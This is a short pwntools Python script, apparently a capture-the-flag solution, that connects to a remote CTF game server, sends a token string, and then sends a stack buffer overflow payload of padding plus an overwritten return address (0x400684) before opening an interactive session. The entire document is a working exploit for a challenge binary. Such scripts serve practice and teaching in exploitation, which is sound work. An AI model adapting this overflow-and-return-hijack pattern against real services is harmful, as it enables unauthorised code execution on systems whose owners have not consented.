from pwn import *

p = remote("ctfgame.acdxvfsvd.net" , 10002)

payload = "a" * 0x10 + "b" * 0x8 + p64(0x400684)
p.recvline()
p.sendline("zs4cYHvh7gEeFVqAj5UBFTTQvJzTAXrv")
p.recvuntil("ROP\n")
p.sendline(payload)
p.interactive()